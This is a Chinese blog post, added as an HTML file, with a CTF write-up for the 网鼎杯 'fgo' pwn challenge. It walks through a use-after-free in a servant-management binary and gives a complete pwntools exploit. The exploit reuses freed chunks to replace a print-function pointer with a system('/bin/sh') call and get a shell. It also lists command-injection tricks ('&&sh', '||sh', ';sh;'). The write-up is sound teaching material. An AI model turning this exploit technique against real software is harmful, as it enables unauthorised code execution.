@@ -1,0 +1,242 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  <title>网鼎杯2(fgo) | Tower</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="description" content="123456[*] &amp;apos;/home/liu/1t/u18/\xe6\x96\x87\xe6\xa1\xa3/\xe7\xbd\x91\xe9\xbc\x8e\xe6\x9d\xaf/\xe7\x8e\x8b\xe9\xbc\x8e2/fgo/pwn&amp;apos;    Arch:     i386-32-little    RELRO:    Partial RELRO    Stack:">
+<meta name="keywords" content="ctf">
+<meta property="og:type" content="article">
+<meta property="og:title" content="网鼎杯2(fgo)">
+<meta property="og:url" content="http://yoursite.com/2018/09/02/网鼎杯2-fgo/index.html">
+<meta property="og:site_name" content="Tower">
+<meta property="og:description" content="123456[*] &amp;apos;/home/liu/1t/u18/\xe6\x96\x87\xe6\xa1\xa3/\xe7\xbd\x91\xe9\xbc\x8e\xe6\x9d\xaf/\xe7\x8e\x8b\xe9\xbc\x8e2/fgo/pwn&amp;apos;    Arch:     i386-32-little    RELRO:    Partial RELRO    Stack:">
+<meta property="og:locale" content="zh-CN">
+<meta property="og:updated_time" content="2018-09-02T11:01:03.351Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="网鼎杯2(fgo)">
+<meta name="twitter:description" content="123456[*] &amp;apos;/home/liu/1t/u18/\xe6\x96\x87\xe6\xa1\xa3/\xe7\xbd\x91\xe9\xbc\x8e\xe6\x9d\xaf/\xe7\x8e\x8b\xe9\xbc\x8e2/fgo/pwn&amp;apos;    Arch:     i386-32-little    RELRO:    Partial RELRO    Stack:">
+  
+  
+    <link rel="icon" href="/favicon.png">
+  
+  <!-- <link href='http://fonts.googleapis.com/css?family=Open+Sans:400,600' rel='stylesheet' type='text/css'> -->
+  <!-- <link href="//fonts.googleapis.com/css?family=Source+Code+Pro:400,700" rel="stylesheet" type="text/css"> -->
+  <link href="//fonts.useso.com/css?family=Source+Code+Pro:400,700" rel="stylesheet" type="text/css">
+  <link href='//fonts.useso.com/css?family=Open+Sans:300,600' rel='stylesheet' type='text/css'>
+  <link rel="stylesheet" href="/css/style.css">
+  
+
+</head>
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="header-outer" class="outer">
+    <a href="/" class="logo">Tower</a>
+    <div id="header-inner" class="inner">
+      <nav id="main-nav">
+        <a id="main-nav-toggle" class="nav-icon"></a>
+        
+          <a class="main-nav-link" href="/">Home</a>
+        
+          <a class="main-nav-link" href="/archives">Archives</a>
+        
+          <a class="main-nav-link" href="/about/index.html">About</a>
+        
+      </nav>
+      <nav id="sub-nav">
+        <div id="search-form-wrap">
+          <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://yoursite.com"></form>
+        </div>
+        <a id="nav-search-btn" class="nav-icon" title="Search"></a>
+        
+        
+          <a id="nav-github-link" class="nav-icon" href="https://tower111.github.io/" title="Fork me on GitHub"></a>
+        
+      </nav>
+    </div>
+  </div>
+</header>
+      <nav id="mobile-nav" class="off">
+  
+    <a href="/" class="mobile-nav-link">Home</a>
+  
+    <a href="/archives" class="mobile-nav-link">Archives</a>
+  
+    <a href="/about/index.html" class="mobile-nav-link">About</a>
+  
+  <div id="search-form-wrap-mobile">
+    <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://yoursite.com"></form>
+  </div>
+</nav>
+      <div class="outer">
+        
+          <aside id="sidebar">
+  
+    
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Archives</h3>
+    <div class="widget">
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/09/">九月 2018</a><span class="archive-list-count">3</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/08/">八月 2018</a><span class="archive-list-count">9</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/05/">五月 2018</a><span class="archive-list-count">1</span></li></ul>
+    </div>
+  </div>
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Recents</h3>
+    <div class="widget">
+      <ul>
+        
+          <li>
+            <a href="/2018/09/02/网鼎杯2-fgo/">网鼎杯2(fgo)</a>
+          </li>
+        
+          <li>
+            <a href="/2018/09/02/ISG/">ISG</a>
+          </li>
+        
+          <li>
+            <a href="/2018/09/01/hose-of-lore/">hose of lore</a>
+          </li>
+        
+          <li>
+            <a href="/2018/08/31/堆中获取地址和劫持执行流的方法/">堆中获取地址和劫持执行流的方法</a>
+          </li>
+        
+          <li>
+            <a href="/2018/08/30/ISG-babynote/">ISG(babynote)</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Tags</h3>
+    <div class="widget">
+      <ul class="tag-list"><li class="tag-list-item"><a class="tag-list-link" href="/tags/ctf/">ctf</a><span class="tag-list-count">4</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/double-free-unlink/">double free,unlink</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/基础知识/">基础知识</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/堆攻击模型/">堆攻击模型</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/堆溢出-house-of-einherjar/">堆溢出,house of einherjar</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/技巧，堆溢出，总结/">技巧，堆溢出，总结</a><span class="tag-list-count">1</span></li></ul>
+    </div>
+  </div>
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Tag Cloud</h3>
+    <div class="widget tagcloud">
+      <a href="/tags/ctf/" style="font-size: 20px;">ctf</a> <a href="/tags/double-free-unlink/" style="font-size: 10px;">double free,unlink</a> <a href="/tags/基础知识/" style="font-size: 10px;">基础知识</a> <a href="/tags/堆攻击模型/" style="font-size: 10px;">堆攻击模型</a> <a href="/tags/堆溢出-house-of-einherjar/" style="font-size: 10px;">堆溢出,house of einherjar</a> <a href="/tags/技巧，堆溢出，总结/" style="font-size: 10px;">技巧，堆溢出，总结</a>
+    </div>
+  </div>
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">links</h3>
+    <div class="widget">
+      <ul>
+        
+          <li>
+            <a href="http://github.com/tower111/tower111.github.io.git">Hexo</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+
+  
+</aside>
+        
+        <section id="main"><article id="post-网鼎杯2-fgo" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2018/09/02/网鼎杯2-fgo/" class="article-date">
+  <time datetime="2018-09-02T03:51:36.000Z" itemprop="datePublished">2018-09-02</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      网鼎杯2(fgo)
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[*] &apos;/home/liu/1t/u18/\xe6\x96\x87\xe6\xa1\xa3/\xe7\xbd\x91\xe9\xbc\x8e\xe6\x9d\xaf/\xe7\x8e\x8b\xe9\xbc\x8e2/fgo/pwn&apos;</span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure>
+<p>got表可写。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">--------------------------</span><br><span class="line"> 1. Add servant           </span><br><span class="line"> 2. Delete servant        </span><br><span class="line"> 3. Print servant         </span><br><span class="line"> 4. Exit</span><br></pre></td></tr></table></figure></p>
+<p>提供了add，delete，print，函数(没有edit)。</p>
+<p>add功能：<br>nodelist在bss段。每个node存放在一个chunk（size=0x10）里，chunk[0]=<em>put   chunk[2]=</em>content  congent的chunk可以自由分配。<br>最多可以申请5个node。</p>
+<p>free函数<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">if ( servantlist[v1] )</span><br><span class="line">&#123;</span><br><span class="line">  free(*((void **)servantlist[v1] + 1));</span><br><span class="line">  free(servantlist[v1]);</span><br><span class="line">  puts(&quot;Success &quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p>删除之后指针没有清零，count也没有减，最多add 5次</p>
+<p>程序里面给出了system(“/bin/sh”)函数，目的就是劫持程序执行流，让程序执行它。<br>看一个完整的node<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">0x9b9b000 FASTBIN &#123;</span><br><span class="line">  prev_size = 0, </span><br><span class="line">  size = 17, </span><br><span class="line">  fd = 0x804862b &lt;print_servant_content&gt;, </span><br><span class="line">  bk = 0x9b9b018, </span><br><span class="line">  fd_nextsize = 0x0, </span><br><span class="line">  bk_nextsize = 0x39</span><br><span class="line">&#125;</span><br><span class="line">0x9b9b010 FASTBIN &#123;</span><br><span class="line">  prev_size = 0, </span><br><span class="line">  size = 57, </span><br><span class="line">  fd = 0xa41, </span><br><span class="line">  bk = 0x0, </span><br><span class="line">  fd_nextsize = 0x0, </span><br><span class="line">  bk_nextsize = 0x0</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p>也就是说当调用show的时候会调用<code>fd = 0x804862b &lt;print_servant_content&gt;</code>地址处的函数，这个地址完全可以设置为system(“/bin/sh”)。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">context.log_level=&apos;debug&apos;</span><br><span class="line"></span><br><span class="line">system_addr=0x08048956</span><br><span class="line">bss_addr=0x0804B050</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p=process(&quot;./pwn&quot;)</span><br><span class="line"></span><br><span class="line">elf=ELF(&quot;./pwn&quot;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def Add(size,concent):</span><br><span class="line"></span><br><span class="line">    p.recvuntil(&quot;Your choice:\n&quot;)</span><br><span class="line"></span><br><span class="line">    p.sendline(&quot;1&quot;)</span><br><span class="line"></span><br><span class="line">    p.recvuntil(&quot;the size of servant&apos;s name : \n&quot;)</span><br><span class="line"></span><br><span class="line">    p.sendline(str(size))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    p.recvuntil(&quot;ability : \n&quot;)</span><br><span class="line"></span><br><span class="line">    p.sendline(concent)</span><br><span class="line"></span><br><span class="line">    p.recvuntil(&quot;Success !\n&quot;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def Delete(ID):</span><br><span class="line"></span><br><span class="line">    p.recvuntil(&quot;Your choice:\n&quot;)</span><br><span class="line"></span><br><span class="line">    p.sendline(&quot;2&quot;)</span><br><span class="line"></span><br><span class="line">    p.recvuntil(&quot;Index :&quot;)</span><br><span class="line"></span><br><span class="line">    p.sendline(str(ID))</span><br><span class="line"></span><br><span class="line">    p.recvuntil(&quot;Success \n&quot;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def Print(id):</span><br><span class="line"></span><br><span class="line">    p.recvuntil(&quot;Your choice:\n&quot;)</span><br><span class="line"></span><br><span class="line">    p.sendline(&quot;3&quot;)</span><br><span class="line"></span><br><span class="line">    p.recvuntil(&quot;Index :&quot;)</span><br><span class="line"></span><br><span class="line">    p.sendline(str(id))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#x /10xw 0x0804B050</span><br><span class="line"></span><br><span class="line">Add(0x30,&quot;A&quot;)</span><br><span class="line">Add(0x30,&quot;b&quot;)</span><br><span class="line">gdb.attach(p)</span><br><span class="line">Delete(0)</span><br><span class="line">Delete(1)</span><br><span class="line"></span><br><span class="line">Add(8,p32(system_addr))</span><br><span class="line">Print(0)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></p>
+<p>有一点需要注意删除的时候顺序是先0后1申请的时候就是先1后0，让伪造的chunk0来执行show。</p>
+<p>思考：<br>这里介绍了有2层chunk的利用方法.<br>其实堆溢漏洞的普遍利用方法就是想办法申请到控制chunk的内容。<br>注意控制chunk中数据原本的含义。</p>
+<p>堆漏洞利用的根本就是申请到原本有意义的空间然后修改这些值达到自己的目的。不用拘泥于double free，unlink等方法。</p>
+<p>本题没有system函数也能getshell不过需要system参数截断。<br>&amp;&amp;sh，类似的还有||sh，;sh; 都可以达到system(/bin/sh)的效果，不过只有四个字节，比较好用。<br>参考链接<a href="https://blog.csdn.net/qq_35429581/article/details/78231443" target="_blank" rel="noopener">https://blog.csdn.net/qq_35429581/article/details/78231443</a></p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://yoursite.com/2018/09/02/网鼎杯2-fgo/" data-id="cjlkqx3cd000fmel3fvlr6via" class="article-share-link">Share</a>
+      
+      
+  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/ctf/">ctf</a></li></ul>
+
+    </footer>
+  </div>
+  
+    
+<nav id="article-nav">
+  
+  
+    <a href="/2018/09/02/ISG/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Older</strong>
+      <div class="article-nav-title">ISG</div>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+</section>
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      <a href="/" class="logo">Tower</a>
+      &copy; 2018 tower<br>
+      Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
+    </div>
+  </div>
+</footer>
+    </div>
+    
+
+<script src="/js/jquery.min.js"></script>
+<script src="/js/jquery.scrollLoading.js"></script>
+
+
+  <link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
+  <script src="/fancybox/jquery.fancybox.pack.js"></script>
+
+
+<script src="/js/script.js"></script>
+
+  </div>
+</body>
+</html>
